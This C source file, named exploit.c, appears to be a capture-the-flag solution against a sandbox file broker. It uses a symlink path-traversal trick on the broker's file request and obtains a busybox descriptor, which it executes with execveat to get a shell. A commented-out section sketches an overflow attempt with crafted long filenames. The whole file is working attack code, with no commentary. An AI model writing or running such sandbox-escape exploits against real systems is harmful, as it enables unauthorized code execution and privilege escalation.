// gcc exploit.c client_lib.c util.c -o exploit
#include "client_lib.h"
#include "util.h"

#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

#define AT_EMPTY_PATH   0x1000

int read_shared_file2(char *filename1, char *filename2);
int exit_broker(void);

int main(void){
	char dirname[0x100]={0}, dummy[0x100]={0};
	int fd, i;

	symlink("../../../../../tmp", "tmp");
	read_shared_file2("hoge", "tmp/");
	/*
	write_shared_file("hoge", "a", 1);

   	memset(dirname, 'a', 0xff);
	for(i=0; i<0xf; i++){
		mkdir(dirname, 0700);
		chdir(dirname);
	}

   	memset(dummy, 'X', 0xf0+6);
	read_shared_file2("hoge", dummy);
	unlink(dummy);
	mkdir(dummy, 0700);
	chdir(dummy);

	mkdir(dirname, 0700);
	chdir(dirname);

	read_shared_file2("hoge", "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ\xef\xbe\xad\xde\xbe\xba\xfe");
	exit_broker();
	 */

	fd = read_shared_file("busybox");
	const char * const argv[] = {"sh", NULL};
	syscall(SYS_execveat, fd, "", argv, NULL, AT_EMPTY_PATH);

	/*
	char buf[0x100];
	n = read(fd, buf, sizeof(buf));
	write(1, buf, n);
	 */
}

int read_shared_file2(char *filename1, char *filename2) {
  send_pid(BROKER_FD);
  send_ull(BROKER_FD, GET_FILE);
  send_str(BROKER_FD, filename1);
  send_str(BROKER_FD, filename2);
  char *resp = read_str(BROKER_FD);
  if (strcmp(resp, "OK") != 0) {
    err(1, "resp not OK");
  }
  free(resp);
}

int exit_broker(void) {
  send_pid(BROKER_FD);
  send_ull(BROKER_FD, EXIT);
}
